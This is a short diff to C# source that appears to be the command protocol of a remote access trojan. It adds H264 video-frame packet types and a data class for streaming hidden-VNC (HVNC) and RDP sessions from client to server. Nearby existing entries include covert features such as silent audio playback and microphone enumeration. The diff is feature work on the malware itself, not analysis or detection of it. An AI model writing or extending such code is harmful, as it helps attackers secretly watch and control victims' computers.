@@ -2047,6 +2047,8 @@ internal enum PacketType
     FmSetAttr        = 143,
     FmPlayAudio      = 144,  // server→client: play audio silently {Path}
     FmPlayAudioStop  = 145,  // server→client: stop silent audio
+    HvncH264Frame    = 146,  // client→server: {W, H, D} H264 Annex-B NAL (base64)
+    RdpH264Frame     = 147,  // client→server: {W, H, D} H264 Annex-B NAL (base64)
 
     MicGetDevices    = 150,
     MicDevicesResult = 151,
@@ -2238,6 +2240,13 @@ internal class HvncFrameDataStub
     public string J { get; set; } = string.Empty;
 }
 
+internal class H264FrameDataStub
+{
+    public int    W { get; set; }
+    public int    H { get; set; }
+    public string D { get; set; } = string.Empty; // base64 Annex-B H264 NAL units
+}
+
 internal class HvncInputDataStub
 {
     public string T          { get; set; } = string.Empty;
@@ -2308,6 +2317,7 @@ internal class HvncProgressDataStub
 [JsonSerializable(typeof(FmShowHideDataStub))]
 [JsonSerializable(typeof(FmSetAttrDataStub))]
 [JsonSerializable(typeof(FmPlayAudioDataStub))]
+[JsonSerializable(typeof(H264FrameDataStub))]
 // Microphone
 [JsonSerializable(typeof(MicDeviceStub))]
 [JsonSerializable(typeof(MicDevicesResultStub))]
